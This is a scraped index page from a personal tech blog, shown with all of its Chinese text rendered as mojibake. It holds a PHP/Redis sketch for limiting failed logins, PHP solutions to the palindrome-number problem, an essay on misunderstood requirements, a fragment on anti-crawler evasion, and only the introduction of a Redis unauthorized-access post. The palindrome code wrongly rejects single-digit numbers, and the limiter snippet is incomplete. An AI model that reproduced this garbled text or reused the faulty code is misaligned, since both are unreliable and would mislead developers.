<h3 id="å®šæ—¶æŠ“å–"><a href="#å®šæ—¶æŠ“å–" class="headerlink" title="å®šæ—¶æŠ“å–"></a>å®šæ—¶æŠ“å–</h3><p>ä½¿ç”¨å®šæ—¶ä»»åŠ¡ï¼Œå¹¶æŠŠä¸Šé¢è¯´çš„å¯æŒç»­æŸ¥è¯¢æ–¹æ³•ä½¿ç”¨ä¸Šå³å¯ã€‚</p>
<h3 id="ååçˆ¬è™«"><a href="#ååçˆ¬è™«" class="headerlink" title="ååçˆ¬è™«"></a>ååçˆ¬è™«</h3><p>æœ‰çˆ¬è™«è‡ªç„¶å°±ä¼šæœ‰åçˆ¬è™«çš„æœºåˆ¶ã€‚æœ‰çš„ä½¿ç”¨å•ä¸€çš„ä¸€ç§æœºåˆ¶æ¥é˜²æ­¢ï¼Œæœ‰çš„åˆæ˜¯ä½¿ç”¨æ··åˆçš„æœºåˆ¶æ¥è¿›è¡Œåˆ¶çº¦ã€‚ä¸ç®¡ä»€ä¹ˆæ–¹å¼éƒ½æœ‰è¶Šè¿‡æ–¹æ³•ã€‚ä¸»è¦åçˆ¬è™«æœ‰ï¼š301ä¸­è½¬ã€æ··ä¹±çš„å­—ç¬¦ç¼–ç ã€ä¸æˆå¯¹ html æ ‡ç­¾ä»¥åŠè¯·æ±‚é€Ÿç‡é™åˆ¶ã€‚</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/åŠŸèƒ½/login-limit/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="jani">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/img/12641322.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ç®€æ°çš„ Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/åŠŸèƒ½/login-limit/" itemprop="url">ç™»å½•å¤±è´¥æ¬¡æ•°é™åˆ¶</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-04-11T23:44:37+08:00">
                2019-04-11
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/åŠŸèƒ½/" itemprop="url" rel="index">
                    <span itemprop="name">åŠŸèƒ½</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/åŠŸèƒ½/login-limit/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/åŠŸèƒ½/login-limit/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="è¯´æ˜"><a href="#è¯´æ˜" class="headerlink" title="è¯´æ˜"></a>è¯´æ˜</h2><p>è¿™æ˜¯ä¸€ä¸ªé˜²é¢‘ç¹è¯·æ±‚ç™»å½•æ¥å£å¯¼è‡´æœåŠ¡å™¨æ€§èƒ½å ç”¨è¿‡å¤šã€‚ä¹Ÿå¯ä»¥é˜²æ­¢åˆ«äººå°è¯•å¯†ç </p>
<h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>è®°å½•ç”¨æˆ·è®¿é—®æ¬¡æ•°ï¼Œåˆ°æŒ‡å®šæ¬¡æ•°åå¯¹ä»–è¿›è¡Œé”å¤„ç†ã€‚å®ç°æ–¹æ³•å¾ˆç®€å•ï¼Œå‰ç«¯ä½¿ç”¨ cookie è¿›è¡Œè¯·æ±‚è®°å½•ï¼Œè¯·æ±‚æˆåŠŸä¼šæŠŠç™»å½•æ¬¡æ•°ç›¸å…³çš„ cookie æ¸…ç†æ‰ã€‚æ¥å£ç«¯ä¹Ÿéœ€è¦ä¸€èµ·è¿›è¡Œè®°å½•é˜²æ­¢ç›´æ¥å¯¹æ¥å£è¿›è¡Œè¯·æ±‚ã€‚æ¥å£ç«¯ä½¿ç”¨ redis è®°å½•ä»–çš„ IPï¼Œåˆç”¨åˆ«ä¸€ä¸ªé”®æ¥åˆ¤åˆ«é”çŠ¶æ€ã€‚</p>
<h2 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis-&gt;connect(<span class="string">"127.0.0.1"</span>, <span class="number">6379</span>);</span><br><span class="line">$redis-&gt;auth(<span class="string">'you_password'</span>);</span><br><span class="line">$redis-&gt;select(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">$ip = get_client_ip();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($redis-&gt;get(<span class="string">"login_lock.&#123;$ip&#125;"</span>)) &#123;</span><br><span class="line">    <span class="comment">// ç¦æ­¢è®¿é—®æ¥å£</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ·»åŠ è®¿é—®æ¬¡æ•°</span></span><br><span class="line">$redis-&gt;incr(<span class="string">"login_count.&#123;$ip&#125;"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸Šé”</span></span><br><span class="line">$addLockCount = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">if</span> ($addLockCount &lt; $redis-&gt;get(<span class="string">"login_count.&#123;$ip&#125;"</span>)) &#123;</span><br><span class="line">    <span class="comment">// é”å®šæ¬¡æ•°</span></span><br><span class="line">    $redis-&gt;incr(<span class="string">"login_lock_count.&#123;$ip&#125;"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é”å®šæ¬¡æ•°è¶Šå¤šï¼Œé”å®šæ—¶é—´è¶Šé•¿</span></span><br><span class="line">    $lockTime = <span class="number">60</span> * $redis-&gt;get(<span class="string">"login_lock_count.&#123;$ip&#125;"</span>);</span><br><span class="line">    $redis-&gt;set(<span class="string">"login_lock.&#123;$ip&#125;"</span>, $ip, $lockTime);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¸…ç©ºç™»å½•è®°å½•æ•°</span></span><br><span class="line">    $redis-&gt;del(<span class="string">"login_count.&#123;$ip&#125;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç™»å½•æˆåŠŸè¦è®°å¾—å»é™¤å…³è”çš„ç¼“å­˜</span></span><br><span class="line">$redis-&gt;del(<span class="string">"login_count.&#123;$ip&#125;"</span>);</span><br><span class="line">$redis-&gt;del(<span class="string">"login_lock.&#123;$ip&#125;"</span>);</span><br><span class="line">$redis-&gt;del(<span class="string">"login_lock_count.&#123;$ip&#125;"</span>);</span><br></pre></td></tr></table></figure>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/ç®—æ³•/palindrome-number/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="jani">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/img/12641322.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ç®€æ°çš„ Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/ç®—æ³•/palindrome-number/" itemprop="url">å›æ–‡æ•°</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-04-09T18:25:15+08:00">
                2019-04-09
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ç®—æ³•/" itemprop="url" rel="index">
                    <span itemprop="name">ç®—æ³•</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/ç®—æ³•/palindrome-number/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/ç®—æ³•/palindrome-number/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>åˆ¤æ–­ä¸€ä¸ªæ•´æ•°æ˜¯å¦æ˜¯å›æ–‡æ•°ã€‚å›æ–‡æ•°æ˜¯æŒ‡æ­£åºï¼ˆä»å·¦å‘å³ï¼‰å’Œå€’åºï¼ˆä»å³å‘å·¦ï¼‰è¯»éƒ½æ˜¯ä¸€æ ·çš„æ•´æ•°ã€‚</p>
<p><strong>ç¤ºä¾‹ 1:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥: 121</span><br><span class="line">è¾“å‡º: true</span><br></pre></td></tr></table></figure>
<p><strong>ç¤ºä¾‹ 2:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥: -121</span><br><span class="line">è¾“å‡º: false</span><br><span class="line">è§£é‡Š: ä»å·¦å‘å³è¯», ä¸º -121 ã€‚ ä»å³å‘å·¦è¯», ä¸º 121- ã€‚å› æ­¤å®ƒä¸æ˜¯ä¸€ä¸ªå›æ–‡æ•°ã€‚</span><br></pre></td></tr></table></figure>
<p><strong>ç¤ºä¾‹ 3:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥: 10</span><br><span class="line">è¾“å‡º: false</span><br><span class="line">è§£é‡Š: ä»å³å‘å·¦è¯», ä¸º 01 ã€‚å› æ­¤å®ƒä¸æ˜¯ä¸€ä¸ªå›æ–‡æ•°ã€‚</span><br></pre></td></tr></table></figure>
<p><strong>è¿›é˜¶</strong>:</p>
<p>ä½ èƒ½ä¸å°†æ•´æ•°è½¬ä¸ºå­—ç¬¦ä¸²æ¥è§£å†³è¿™ä¸ªé—®é¢˜å—ï¼Ÿ</p>
<p><a href="https://leetcode-cn.com/problems/reverse-integer/" target="_blank" rel="noopener">é¢˜ç›®é“¾æ¥</a></p>
<p>æ³¨ï¼š åè½¬å›æ–‡æ—¶éœ€æ³¨æ„æ•°å€¼æº¢å‡º</p>
<h2 id="æ ‡ç­¾"><a href="#æ ‡ç­¾" class="headerlink" title="æ ‡ç­¾"></a>æ ‡ç­¾</h2><ul>
<li>æ•°å­¦</li>
</ul>
<h2 id="ä¸ªäººè§£ç­”"><a href="#ä¸ªäººè§£ç­”" class="headerlink" title="ä¸ªäººè§£ç­”"></a>ä¸ªäººè§£ç­”</h2><p>å¦‚é¢˜å¯çŸ¥å•æ•°ï¼Œè´Ÿæ•°ï¼Œ0ç»“å°¾çš„æ•´æ•°éƒ½ä¸æ˜¯å›æ–‡æ•°</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ–¹æ³•1 å‰åæ•°å­—å¯¹æ¯”</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPalindrome</span><span class="params">($x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($x &lt; <span class="number">9</span> || ($x % <span class="number">10</span> === <span class="number">0</span>)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    $x = (string)$x;</span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line">    $max = strlen($x) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ($i &lt; $max) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($x&#123;$i&#125; == $x&#123;$max&#125;) &#123;</span><br><span class="line">            $i++;</span><br><span class="line">            $max--;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ–¹æ³•2 ç¿»è½¬æ•°å­—å¯¹æ¯”</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPalindrome</span><span class="params">($x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($x &lt; <span class="number">9</span> || ($x % <span class="number">10</span> === <span class="number">0</span>)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    $rev_num = <span class="number">0</span>;</span><br><span class="line">    $val = $x;</span><br><span class="line">    <span class="keyword">while</span> ($val != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// æ³¨ï¼šå‡¡æ˜¯æ•°å­—åè½¬éƒ½å¯èƒ½ä¼šå­˜åœ¨æ•°å­—å€¼è¶ŠèŒƒå›´çš„æƒ…å†µ</span></span><br><span class="line">        $rev_num = bcmul($rev_num, <span class="number">10</span>) + ($val % <span class="number">10</span>);<span class="comment">// ($rev_num * 10) + ($val % 10)</span></span><br><span class="line">        $val = bcdiv($val, <span class="number">10</span>); <span class="comment">// $val / 10;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ($rev_num === $x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ–¹æ³•3 æ•°å­—æ³•å‰åå¯¹æ¯”</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPalindrome</span><span class="params">($x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($x &lt; <span class="number">9</span> || ($x % <span class="number">10</span> === <span class="number">0</span>)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å– $x çš„ä½æ•°</span></span><br><span class="line">    $bit = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">9</span> &lt; bcdiv($x, $bit)) &#123; <span class="comment">// é™¤å‡ºæ¥çš„æ•°å¤§äº 9 å°±è¦è¿›ä½</span></span><br><span class="line">        $bit = $bit * <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">9</span> &lt; $x) &#123; <span class="comment">// é™¤ä¸‹çš„æ•°å¦‚æœå¤§äº 9 å°±è¿˜å¯ä»¥è¿›è¡Œå¯¹æ¯”ï¼Œå¦‚ 10 çš„ 10ï¼Œä¸ªä½æ•°å°±ä¸ç”¨æ¯”äº†</span></span><br><span class="line">        $l = bcdiv($x, $bit); <span class="comment">// $x / $bit</span></span><br><span class="line">        $r = $x % <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($l != $r) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        $x = $x % $bit; <span class="comment">// å»å¤´</span></span><br><span class="line">        $x = bcdiv($x, <span class="number">10</span>); <span class="comment">// å»å°¾ $x / 10</span></span><br><span class="line">        $bit = bcdiv($bit, <span class="number">100</span>); <span class="comment">// $bit / 100 = å¤´+å°¾ = 10 * 10</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="åšé¢˜æ€»ç»“"><a href="#åšé¢˜æ€»ç»“" class="headerlink" title="åšé¢˜æ€»ç»“"></a>åšé¢˜æ€»ç»“</h2><p>è¿™åˆ°é¢˜åŠ æ·±äº†ä¸Šå‘¨åšçš„æ•´æ•°åè½¬æ‰€ä½¿ç”¨çš„å¾ªç¯æŠ€å·§ã€‚</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/æ€è€ƒ/å¦‚ä½•å‡å°‘éœ€æ±‚ç†è§£çš„åå·®/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="jani">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/img/12641322.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ç®€æ°çš„ Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/æ€è€ƒ/å¦‚ä½•å‡å°‘éœ€æ±‚ç†è§£çš„åå·®/" itemprop="url">å¦‚ä½•å‡å°‘éœ€æ±‚ç†è§£çš„åå·®</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-04-07T09:20:14+08:00">
                2019-04-07
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/æ€è€ƒ/" itemprop="url" rel="index">
                    <span itemprop="name">æ€è€ƒ</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/æ€è€ƒ/å¦‚ä½•å‡å°‘éœ€æ±‚ç†è§£çš„åå·®/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/æ€è€ƒ/å¦‚ä½•å‡å°‘éœ€æ±‚ç†è§£çš„åå·®/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>å·¥ä½œä¸­ï¼Œæˆ‘ä»¬æ€»æ˜¯ä¼šå› ä¸ºç§ç§åŸå› å¯¼è‡´è‡ªå·±åšçš„åŠŸèƒ½ä¸åˆæ ¼éœ€è¦é‡åšã€‚é‚£ä¹ˆå¦‚ä½•å‡å°‘éœ€è¦ç†è§£çš„åå·®å‘¢ï¼Ÿ</p>
<h2 id="æ€è€ƒ"><a href="#æ€è€ƒ" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h2><h3 id="ä¸ºä»€ä¹ˆæ€»æƒ³ç€åšä¸€æ­¥æƒ³ä¸€æ­¥å‘¢"><a href="#ä¸ºä»€ä¹ˆæ€»æƒ³ç€åšä¸€æ­¥æƒ³ä¸€æ­¥å‘¢" class="headerlink" title="ä¸ºä»€ä¹ˆæ€»æƒ³ç€åšä¸€æ­¥æƒ³ä¸€æ­¥å‘¢"></a>ä¸ºä»€ä¹ˆæ€»æƒ³ç€åšä¸€æ­¥æƒ³ä¸€æ­¥å‘¢</h3><p>å¾ˆå¤šæ—¶å€™æˆ‘ä»¬æ¥åˆ°ä»»åŠ¡æ€»æ˜¯å¿ä¸äº†è‡ªå·±å†…å¿ƒçš„å†²åŠ¨ï¼Œä¸Šå»å°±æ˜¯å¹²ã€‚è¦ä¹ˆå¼€å‘åˆ°ä¸€åŠå› ä¸ºä¸€ä¸ªåŠŸèƒ½ç»†èŠ‚æ•´ä¸ªç¨‹åºçš„è®¾è®¡éƒ½ä¸åˆç†è¦é‡æ„ï¼Œè¦ä¹ˆå®Œæˆåï¼Œæ”¹äº† N æ¬¡éƒ½è¿˜æ˜¯æ²¡æœ‰è¢«åˆ¤æ–­ä»»åŠ¡å®Œæˆã€‚å¦‚æœæˆ‘ä»¬æ¥åˆ°ä»»åŠ¡æ—¶æŠŠåŠŸèƒ½çš„æ¯ä¸ªç»†èŠ‚éƒ½è¿‡ä¸€éã€‚æŠŠä¸æ˜ç™½çš„åœ°æ–¹é—®äº§å“é—®æ¸…æ¥šï¼Œé‚£åé¢å¼€å‘å®Œåå°±åªä¼šæ˜¯éœ€æ±‚ä¿®æ”¹çš„é‚£ç§ä¿®æ”¹äº†ï¼Œè¿™å°±ä¸æ˜¯è‡ªèº«çš„é—®é¢˜äº†ã€‚</p>
<h3 id="ä¸ºä»€ä¹ˆåŒä¸€ä¸ªåŸå‹åˆ«äººç†è§£çš„åŠŸèƒ½å’Œæˆ‘ç†è§£çš„ä¸åŒ"><a href="#ä¸ºä»€ä¹ˆåŒä¸€ä¸ªåŸå‹åˆ«äººç†è§£çš„åŠŸèƒ½å’Œæˆ‘ç†è§£çš„ä¸åŒ" class="headerlink" title="ä¸ºä»€ä¹ˆåŒä¸€ä¸ªåŸå‹åˆ«äººç†è§£çš„åŠŸèƒ½å’Œæˆ‘ç†è§£çš„ä¸åŒ"></a>ä¸ºä»€ä¹ˆåŒä¸€ä¸ªåŸå‹åˆ«äººç†è§£çš„åŠŸèƒ½å’Œæˆ‘ç†è§£çš„ä¸åŒ</h3><p>å°±åƒèå£«æ¯”äºšè¯´çš„ï¼šâ€œä¸€åƒä¸ªè¯»è€…å°±æœ‰ä¸€åƒä¸ªå“ˆå§†é›·ç‰¹â€ï¼Œæ¯ä¸ªäººç†è§£æ–¹é¢éƒ½ä¼šæœ‰åå·®ã€‚æœ€å¥½çš„çŠ¶æ€å°±æ˜¯æ‰€ä»¥åŠŸèƒ½å¼€å‘çš„åŸå› éƒ½äº†è§£æ¸…æ¥šã€‚è¦ä¸ç„¶åšä¸€ä¸ªè¿ä½ è‡ªå·±éƒ½è§‰å¾—æ²¡ç”¨çš„åŠŸèƒ½ï¼Œåé¢ç æ‰äº†ä½ ä¹Ÿæ— å¤„è®²ç†å»ã€‚è€Œå®ç°çš„ç»†èŠ‚æˆ‘ä»¬å¯ä»¥å‘äº§å“ä»¥åŠç»„é•¿æ ¡å¯¹è‡ªå·±çš„ç†è§£ã€‚æ‰ä¼šæœ€å¤§é™åº¦çš„å‡å°‘è¯¯å·®ã€‚</p>
<h2 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h2><p>ä¸ç®¡åœ¨å·¥ä½œä¸­è¿˜æ˜¯åœ¨å¹³æ—¶ç”Ÿæ´»ä¸­ï¼Œæˆ‘ä»¬åº”è¯¥æ·±å…¥åšäº‹çš„åŸå› ã€‚å¦‚æœæ˜¯å¸®å¿™ï¼Œéœ€è¦å®Œå…¨ç¡®è®¤è‡ªå·±çš„ç†è§£æ˜¯å¦åå·®ï¼Œå¼€å‘çš„ç»†èŠ‚æ˜¯å¦æœ‰é—æ¼ã€‚æ²Ÿé€šçš„æˆæœ¬ç¡®å®æ˜¯å¾ˆå¤§ã€‚ä½†æ˜¯åŠ¨è„‘åŠ¨å˜´æ¯”åŠ¨æ‰‹æ¥çš„è½»æ¾å¾ˆå¤šã€‚</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/ç¿»è¯‘/redis-unauthorized-access-vulnerability-simulation/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="jani">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/img/12641322.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ç®€æ°çš„ Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/ç¿»è¯‘/redis-unauthorized-access-vulnerability-simulation/" itemprop="url">redis unauthorized access vulnerability simulation(redisæœªç»æˆæƒçš„è®¿é—®æ¼æ´æ¨¡æ‹Ÿ)</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-04-06T20:43:02+08:00">
                2019-04-06
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ç¿»è¯‘/" itemprop="url" rel="index">
                    <span itemprop="name">ç¿»è¯‘</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/ç¿»è¯‘/redis-unauthorized-access-vulnerability-simulation/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/ç¿»è¯‘/redis-unauthorized-access-vulnerability-simulation/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>Redis, is an open source, widely popular data structure tool that can be used as an in-memory distributed database, message broker or cache. Since it is designed to be accessed inside trusted environments, it should not be exposed on the Internet. However, some Redisâ€™ are bind to public interface and even has no password authentication protection.</p>
